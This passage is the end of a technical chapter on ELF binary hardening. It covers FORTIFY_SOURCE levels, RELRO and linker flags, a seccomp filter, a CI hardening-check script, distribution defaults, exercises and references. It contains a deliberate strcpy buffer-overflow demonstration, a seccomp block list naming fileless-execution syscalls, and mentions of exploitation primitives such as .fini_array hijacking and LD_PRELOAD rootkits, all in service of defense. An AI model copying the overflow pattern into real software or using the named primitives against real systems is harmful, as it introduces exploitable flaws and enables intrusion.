**FORTIFY_SOURCE=3 vs =2 — the critical difference:**

```c
/* This overflow is caught by FORTIFY_SOURCE=3 but NOT by =2 */
void copy_data(char *dst, size_t dst_size, const char *src) {
    /* =2 sees dst as "unknown size" — no check inserted
     * =3 uses __builtin_dynamic_object_size(dst) = dst_size — check inserted */
    strcpy(dst, src);
}

void caller(void) {
    char buf[64];
    copy_data(buf, sizeof(buf),
              "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    /* With =3: *** buffer overflow detected *** at runtime
     * With =2: silent corruption */
}
```

### 19.2 Linker hardening flags

| Flag | Effect | Mitigates |
|------|--------|-----------|
| `-z relro` | Mark `.got`, `.dynamic`, `.init_array`, `.fini_array` as read-only after relocation | GOT overwrite, `.fini_array` hijack |
| `-z now` | Resolve all symbols at load time; include `.got.plt` in RELRO region | Lazy-binding PLT attacks |
| `-z noexecstack` | Set `PT_GNU_STACK` to non-executable | Stack shellcode execution |
| `-z separate-code` | Place code and data in separate `PT_LOAD` segments with distinct permissions | W^X violations; limits ROP gadget reachability from data pages |
| `--as-needed` | Only link libraries that resolve at least one undefined symbol | Reduces attack surface by removing unnecessary DSO dependencies |
| `-z nodlopen` | Sets `DF_1_NOOPEN`; prevents library from being loaded via `dlopen` | Library injection via `dlopen` in plugins |
| `-z nodelete` | Sets `DF_1_NODELETE`; library cannot be unloaded via `dlclose` | Use-after-free from premature unload |

**Partial vs full RELRO internals:**

```bash
# Partial RELRO: -z relro (without -z now)
# .got (dynamic metadata GOT) → read-only after relocation
# .got.plt (PLT function pointers) → remains writable for lazy binding
$ readelf -d partial_relro_binary | grep -E 'BIND_NOW|FLAGS'
# No BIND_NOW flag
$ readelf -l partial_relro_binary | grep GNU_RELRO
  GNU_RELRO    0x000000000002de00 ...     RW     0x1

# Full RELRO: -z relro -z now
# Both .got and .got.plt → read-only after relocation
# All symbols resolved at load time (no lazy binding)
$ readelf -d full_relro_binary | grep -E 'BIND_NOW|FLAGS'
 0x0000000000000018 (BIND_NOW)
 0x000000006ffffffb (FLAGS_1)   Flags: NOW
$ readelf -l full_relro_binary | grep GNU_RELRO
  GNU_RELRO    0x000000000002de00 ...     RW     0x1
# The mprotect to read-only happens after ALL relocations complete
```

### 19.3 Runtime hardening

**seccomp for loader restriction:**

```c
/* seccomp_loader_restrict.c — restrict syscalls after ELF loading completes
 * Apply after all dlopen() calls are done to prevent loader abuse.
 */
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/prctl.h>
#include <unistd.h>

/* After application init, deny new library loading */
void lock_dynamic_loader(void) {
    /* Deny mmap with PROT_EXEC on new regions (blocks dlopen) */
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),
        /* Allow most syscalls — deny only the dangerous ones */
        /* Block execveat (fileless exec) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execveat, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | (1 & 0xFFFF)),
        /* Block memfd_create (fileless staging) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_memfd_create, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | (1 & 0xFFFF)),
        /* Allow everything else */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}
```

**`LD_BIND_NOW` enforcement at the system level:**

```bash
# System-wide eager binding (eliminates lazy-binding attack window)
echo "LD_BIND_NOW=1" >> /etc/environment

# Per-service enforcement via systemd
# In [Service] section:
Environment=LD_BIND_NOW=1

# Verify at runtime
$ LD_DEBUG=bindings LD_BIND_NOW=1 ./binary 2>&1 | head -5
      2468: binding file ./binary [0] to /lib/x86_64-linux-gnu/libc.so.6 [0]:
            normal symbol `puts' [GLIBC_2.2.5]
# All bindings happen at startup, not on first call
```

### 19.4 Binary hardening verification — CI/CD integration

```bash
#!/bin/bash
# ci_checksec_gate.sh — CI/CD quality gate for ELF hardening
# Exit 1 if any binary fails minimum hardening requirements.
# Usage: ./ci_checksec_gate.sh ./build/output/

set -euo pipefail

TARGET_DIR="${1:-.}"
FAILURES=0

check_binary() {
    local bin="$1"
    local issues=""

    # RELRO check
    local relro_type="none"
    readelf -l "$bin" 2>/dev/null | grep -q "GNU_RELRO" && relro_type="partial"
    readelf -d "$bin" 2>/dev/null | grep -q "BIND_NOW" && relro_type="full"
    if [ "$relro_type" != "full" ]; then
        issues+="  FAIL: RELRO=$relro_type (require full)\n"
    fi

    # Stack canary
    if ! readelf -s "$bin" 2>/dev/null | grep -q "__stack_chk_fail"; then
        issues+="  FAIL: No stack canary\n"
    fi

    # NX (non-executable stack)
    if readelf -l "$bin" 2>/dev/null | grep "GNU_STACK" | grep -q "RWE"; then
        issues+="  FAIL: Executable stack (RWE)\n"
    fi

    # PIE
    local etype
    etype=$(readelf -h "$bin" 2>/dev/null | grep "Type:" | awk '{print $2}')
    if [ "$etype" = "EXEC" ]; then
        issues+="  FAIL: Non-PIE executable\n"
    fi

    # FORTIFY_SOURCE
    local has_chk has_unsafe
    has_chk=$(readelf -s "$bin" 2>/dev/null | grep -c "_chk@" || true)
    has_unsafe=$(readelf -s "$bin" 2>/dev/null | \
                 grep -cE " (memcpy|strcpy|sprintf|strcat|gets)@" || true)
    if [ "$has_unsafe" -gt 0 ] && [ "$has_chk" -eq 0 ]; then
        issues+="  WARN: No FORTIFY_SOURCE detected\n"
    fi

    # RPATH pointing to writable directories
    local rpath
    rpath=$(readelf -d "$bin" 2>/dev/null | \
            grep -oP '(?<=RPATH|RUNPATH\] )[^\]]*' || true)
    if [ -n "$rpath" ]; then
        echo "$rpath" | tr ':' '\n' | while read -r dir; do
            if [ -d "$dir" ] && [ -w "$dir" ]; then
                issues+="  FAIL: Writable RPATH directory: $dir\n"
            fi
        done
    fi

    if [ -n "$issues" ]; then
        echo "FAILED: $bin"
        echo -e "$issues"
        return 1
    fi
    return 0
}

while IFS= read -r -d '' bin; do
    file "$bin" 2>/dev/null | grep -q "ELF" || continue
    if ! check_binary "$bin"; then
        FAILURES=$((FAILURES + 1))
    fi
done < <(find "$TARGET_DIR" -type f -executable -print0)

if [ "$FAILURES" -gt 0 ]; then
    echo "=== $FAILURES binary/binaries failed hardening gate ==="
    exit 1
fi
echo "=== All binaries passed hardening checks ==="
```

### 19.5 Distribution hardening comparison

The following table compares default compiler and linker hardening flags across major Linux distributions as of 2025:

| Feature | Ubuntu 24.04 | Fedora 41 | Alpine 3.20 | Debian 13 | Android 15 (NDK r27) |
|---------|-------------|-----------|-------------|-----------|----------------------|
| Stack protector | `-fstack-protector-strong` | `-fstack-protector-strong` | `-fstack-protector-strong` | `-fstack-protector-strong` | `-fstack-protector-strong` |
| FORTIFY_SOURCE | `=2` (moving to `=3`) | `=3` (since F37) | `=2` | `=2` | `=2` |
| PIE | Default for all packages | Default for all packages | Default for all packages | Default for all packages | Mandatory |
| RELRO | Full (`-z relro -z now`) | Full (`-z relro -z now`) | Full (`-z relro -z now`) | Full (`-z relro -z now`) | Full |
| NX stack | `-z noexecstack` | `-z noexecstack` | `-z noexecstack` | `-z noexecstack` | `-z noexecstack` |
| Separate code | Not default | `-z separate-code` (since F33) | Not default | Not default | Yes |
| Stack clash protection | `-fstack-clash-protection` | `-fstack-clash-protection` | Not default | `-fstack-clash-protection` | N/A (ARM) |
| CET (IBT+SHSTK) | Enabled (x86_64 packages) | Enabled (since F37) | Not default | Experimental | N/A |
| BTI (AArch64) | Enabled (arm64 packages) | Enabled | Not default | Experimental | Enabled |
| PAC (AArch64) | Enabled (arm64 packages) | Enabled | Not default | Experimental | Enabled |
| `-ftrivial-auto-var-init` | Not default | `=zero` (since F39) | Not default | Not default | `=zero` |
| `-Wformat-security` | `-Werror=format-security` | `-Werror=format-security` | `-Wformat-security` | `-Werror=format-security` | Warning only |
| `BIND_NOW` | Default for most packages | Default for all | Default for all | Default for most | Default |

**Key observations:**

- Fedora is the most aggressive mainstream distribution for hardening, having adopted `FORTIFY_SOURCE=3`, CET, and trivial auto-var-init ahead of others.
- Alpine's musl libc does not support all glibc FORTIFY features, and its default compiler flags are less hardened. However, musl's simpler codebase means a smaller attack surface in the loader itself.
- Android's NDK enforces the strictest requirements for app-developer code but runs on ARM exclusively, so CET is irrelevant; BTI/PAC serve the equivalent role.
- Ubuntu and Debian track each other closely but Debian moves more conservatively on experimental features like CET and BTI.

**Verification across distributions:**

```bash
# Check a distribution's default compiler flags (dpkg-buildflags on Debian/Ubuntu)
$ dpkg-buildflags --get CFLAGS
-g -O2 -ffile-prefix-map=/build=. -fstack-protector-strong \
-Wformat -Werror=format-security

$ dpkg-buildflags --get LDFLAGS
-Wl,-z,relro -Wl,-z,now

# Fedora equivalent (rpm --eval)
$ rpm --eval '%{optflags}'
-O2 -flto=auto -ffat-lto-objects -fexceptions -g -grecord-gcc-switches \
-pipe -Wall -Werror=format-security -Wp,-D_FORTIFY_SOURCE=3 \
-Wp,-D_GLIBCXX_ASSERTIONS -specs=/usr/lib/rpm/redhat/redhat-hardened-cc1 \
-fstack-protector-strong -specs=/usr/lib/rpm/redhat/redhat-annobin-cc1 \
-m64 -march=x86-64 -mtune=generic -fasynchronous-unwind-tables \
-fstack-clash-protection -fcf-protection=full

# Alpine (abuild)
$ grep CFLAGS /etc/abuild.conf
export CFLAGS="-Os -fstack-protector-strong"
```

---

## 20. Cross-references for the rest of the library

**From this chapter to the attack taxonomy (Section 1):**

TLS corruption and stack-canary bypass: an attacker who can read/write near the thread pointer can extract `__stack_chk_guard` (from `AT_RANDOM` via TCB) and forge canaries. The detection surface is the integrity of the TCB and the thread-pointer region.

Constructor/destructor hijacking: `.init_array`/`.fini_array` corruption is a classic exploitation primitive closed by full RELRO. The mitigation is build-system enforcement of `-z relro -z now`.

IFUNC as a load-time code-execution hook: relevant to shared-library implant analysis.

Symbol versioning as a defense against accidental ABI mismatch and as a constraint on interposition-based hooking.

CET/BTI/PAC as the hardware-backed mitigations against ROP/JOP/COP: their deployment status is the single most important hardening metric for forward-edge and backward-edge control-flow integrity.

ELF exploitation techniques (§16): `.fini_array` hijack, IFUNC resolver abuse, `DT_RPATH` injection, PT_NOTE infection, and `LD_PRELOAD` rootkit persistence expand the exploitation vocabulary from Chapter 1A into the advanced feature space.

Detection engineering (§17): Sigma rules, YARA signatures, and auditd rules for detecting ELF loader abuse and binary manipulation complement the Chapter 1A detection rules (§16) with coverage of advanced features.

**From this chapter to Domain 2 (process memory and OS primitives):**

`mprotect` calls by the dynamic linker (RELRO, stack NX) are instances of the general `mprotect` syscall mechanism. The auxv lives on the process stack, below `envp`, and is readable from `/proc/PID/auxv` — the `procfs` interface covered in Domain 2. TLS blocks are allocated on the heap; their layout is relevant to heap-exploitation chapters. `AT_SECURE` interacts with the Linux capability and namespace system covered in Domain 2.

Core dump analysis (§18.1) bridges to Domain 2's process-memory model: core files are ELF snapshots of the process VMA layout, and their analysis requires the same segment-permission vocabulary.

**From this chapter to the PE/COFF chapter (Chapter 2):**

TLS callbacks (PE) are the counterpart of `.init_array` constructors (ELF): both run code before `main`/`EntryPoint`, both are attacker-usable hooks, and both are detection targets. CFG/XFG (PE load configuration) and CET-IBT/SHSTK (`PT_GNU_PROPERTY` on ELF) are the parallel forward-edge CFI stories on the two platforms. The stack canary (`__security_cookie` in PE, `__stack_chk_guard` from `AT_RANDOM` in ELF) is initialized differently but serves the same function and has the same information-leak exposure.

The ELF hardening comparison (§19.5) has a direct counterpart in PE's `/GS`, `/DYNAMICBASE`, `/NXCOMPAT`, and `/GUARD:CF` flags — covered in Chapter 2.

This concludes Domain 1. The three chapters together — 1A (ELF core and dynamic linking), 1B (ELF advanced), and 2 (PE/COFF) — provide the binary-format vocabulary for every subsequent domain.

---

## Exercises

1. **TLS Canary Corruption Lab.** Compile the `tls_canary_corrupt.c` program from §1.5 with `-fstack-protector-all -pthread`. Run it under GDB and verify the canary is overwritten at `fs:0x28`. Then modify the program to also corrupt `pointer_guard` at `fs:0x30`. Document the memory layout between `tls_buf` and the TCB. Reference: `tutorials/tutorial_domain1_ch1B_elf_advanced_lab.md`.

2. **IFUNC Detection Pipeline.** Write a Bash script that scans all shared objects in `/usr/lib/x86_64-linux-gnu/` for `STT_GNU_IFUNC` symbols and `R_X86_64_IRELATIVE` relocations. For each hit, classify it as "expected" (libc, libm, libpthread, ld-linux) or "suspicious" (everything else). Then convert the YARA rule from §2.6 into a working rule file and scan the same directory. Compare results.

3. **CET/BTI DSO Audit.** Using the `cet_bti_audit.sh` script from §5.7, audit a running process (e.g., Firefox, ssh, or a custom application) for CET-IBT and CET-SHSTK support gaps. Identify the "weakest link" DSO that prevents CET activation. Rebuild one missing DSO with `-fcf-protection=full` and verify the gap closes.

4. **Constructor Ordering Security Analysis.** Write two shared libraries: `libsecpolicy.so` with a constructor at priority 102 that installs a seccomp filter (using `prctl(PR_SET_SECCOMP)`), and `libnetwork.so` with a constructor at priority 102 that opens a network socket. Link a program against both in different orders and verify that constructor execution order changes. Demonstrate the race condition described in §3.7.

5. **Symbol Versioning Forensics.** Using `readelf --dyn-syms` and `readelf -V`, extract the complete symbol version map for `/lib/x86_64-linux-gnu/libc.so.6`. Identify which GLIBC version introduced `memfd_create`, `copy_file_range`, and `close_range`. Build a detector that flags binaries requiring GLIBC versions newer than the host system's libc.

---

## Readings and References

- glibc TLS implementation — `elf/dl-tls.c` and `nptl/allocatestack.c`: https://sourceware.org/git/?p=glibc.git;a=tree;f=elf (retrieved: 2026-05-29)
- Ulrich Drepper, "ELF Handling For Thread-Local Storage": https://www.akkadia.org/drepper/tls.pdf (retrieved: 2026-05-29)
- Intel Control-flow Enforcement Technology (CET) Specification: https://www.intel.com/content/www/us/en/developer/articles/technical/technical-look-control-flow-enforcement-technology.html (retrieved: 2026-05-29)
- ARM Architecture Reference Manual — Pointer Authentication and BTI: https://developer.arm.com/documentation/ddi0487/latest (retrieved: 2026-05-29)
- CVE-2023-4911 — Looney Tunables glibc ld.so GLIBC_TUNABLES overflow: https://nvd.nist.gov/vuln/detail/CVE-2023-4911 (retrieved: 2026-05-29)
- MITRE ATT&CK T1574.006 — Dynamic Linker Hijacking: https://attack.mitre.org/techniques/T1574/006/ (retrieved: 2026-05-29)
- MITRE ATT&CK T1574.001 — DLL Search Order Hijacking (DT_RPATH analogue): https://attack.mitre.org/techniques/T1574/001/ (retrieved: 2026-05-29)
- DWARF Debugging Information Format v5: https://dwarfstd.org/doc/DWARF5.pdf (retrieved: 2026-05-29)
- Linux kernel `arch/x86/include/asm/cet.h` — CET kernel support: https://elixir.bootlin.com/linux/latest/source/arch/x86 (retrieved: 2026-05-29)
- checksec.sh — binary hardening checker: https://github.com/slimm609/checksec.sh (retrieved: 2026-05-29)
- Qualys Security Advisory — CVE-2023-4911 (Looney Tunables): https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables.txt (retrieved: 2026-05-29)
- GNU C Library symbol versioning documentation: https://sourceware.org/glibc/wiki/Glibc%20Timeline (retrieved: 2026-05-29)

---

## Cross-References

| Chapter | Topic | Relationship |
|---------|-------|-------------|
| `domain1_chapter1A_elf_foundations.md` | ELF header, GOT/PLT, .dynamic, relocations | Foundation structures this chapter extends; lazy binding and RELRO mechanics |
| `domain1_chapter2_pe_coff.md` | TLS callbacks, CFG/XFG, SafeSEH, CET on Windows | Windows counterparts: TLS callbacks ↔ .init_array, CFG ↔ CET-IBT, /GS ↔ canary |
| `domain2_chapter2A_process_memory.md` | mprotect, ASLR, page tables, vDSO | RELRO mprotect calls, auxv on stack, TLS heap allocation, AT_SECURE interaction |
| `domain2_chapter2B_syscall_seccomp_ptrace.md` | seccomp, ptrace, syscall dispatch | Constructor ordering vs seccomp filter installation timing; ptrace TLS inspection |
| `domain3_chapter3A_stack_format_integer.md` | Stack canary from AT_RANDOM, format string writes | Canary stored in TCB at fs:0x28; TLS corruption defeats stack protection |
| `domain4_code_reuse_attacks.md` | ROP/JOP/COP, CET bypass, ENDBR64 gadgets | CET-IBT and Shadow Stack as mitigations; ENDBR64 gadget catalog in §5.5 |

---

## Glossary

- **TLS (Thread-Local Storage):** Per-thread variable storage mechanism using PT_TLS segments and the DTV (Dynamic Thread Vector).
- **TCB (Thread Control Block):** Per-thread structure at `fs:0` containing the stack canary, pointer guard, and DTV pointer.
- **IFUNC (Indirect Function):** GNU extension allowing runtime CPU-feature-based function dispatch via STT_GNU_IFUNC symbols and IRELATIVE relocations.
- **CET (Control-flow Enforcement Technology):** Intel hardware feature comprising IBT (Indirect Branch Tracking) and Shadow Stack for control-flow integrity.
- **IBT (Indirect Branch Tracking):** CET forward-edge CFI: indirect branches must land on ENDBR64 instructions or the CPU faults.
- **Shadow Stack:** CET backward-edge CFI: hardware-maintained copy of return addresses that RET verifies against the software stack.
- **PAC (Pointer Authentication Code):** ARM cryptographic MAC on pointer values using keys in system registers; forged pointers fail authentication.
- **BTI (Branch Target Identification):** ARM forward-edge CFI: indirect branches must land on BTI instructions.
- **DWARF CFI (Call Frame Information):** Bytecoded metadata in .eh_frame describing how to unwind each function's stack frame.
- **Personality Routine:** Exception-handling callback pointer in .eh_frame CIE; called by the unwinder for language-specific dispatch.
- **Symbol Versioning:** Mechanism attaching version tags to symbol definitions and references, enabling ABI compatibility across library versions.
- **DTV (Dynamic Thread Vector):** Per-thread array indexing TLS blocks by module ID; corrupting DTV entries redirects TLS accesses.
- **Looney Tunables:** CVE-2023-4911 — buffer overflow in glibc's `__tunables_init()` exploitable via GLIBC_TUNABLES environment variable for root escalation.
- **RELRO Region:** Memory range covered by PT_GNU_RELRO that becomes read-only after dynamic linker relocation, protecting .dynamic, .got, and metadata tables.
